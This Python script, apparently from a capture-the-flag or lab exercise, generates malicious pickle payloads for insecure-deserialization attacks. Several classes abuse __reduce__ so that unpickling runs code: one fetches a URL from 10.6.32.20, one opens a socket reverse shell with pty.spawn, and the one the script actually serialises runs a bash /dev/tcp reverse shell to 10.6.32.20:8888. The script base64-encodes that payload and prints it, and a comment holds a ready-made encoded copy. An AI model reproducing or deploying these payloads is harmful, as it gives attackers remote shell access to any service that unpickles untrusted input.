import requests
import pickle
import base64

class Expl2:
	def __str__(self):
		return "EXPL"
	def __reduce__(self):
		import sys
		return sys.exit, (1,)


class Expl:
	def __reduce__(self):
		from urllib.request import urlopen
		return urlopen, ("http://10.6.32.20:8000",)


class RevShell2:
	def __reduce__(self):
		import socket,subprocess,os,pty
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(("10.6.32.20",8888))
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)

		#pty.spawn("/bin/bash")
		return pty.spawn, ("/bin/bash",)



class RevShell:
	def __reduce__(self):
		import os
		return os.system, ("bash -c 'bash -i >& /dev/tcp/10.6.32.20/8888 0>&1'",)




dumped_str = pickle.dumps(RevShell())
#dumped_str = pickle.dumps("expl")
encoded = base64.b64encode(dumped_str).decode()

print("Payload :")
print(encoded)

#encoded = "gASVQwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjChiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjYuMzIuMjAvODg4OCAwPiYxlIWUUpQu"
#decoded = base64.b64decode(encoded)
#obj = pickle.loads(decoded)
#print(encoded)

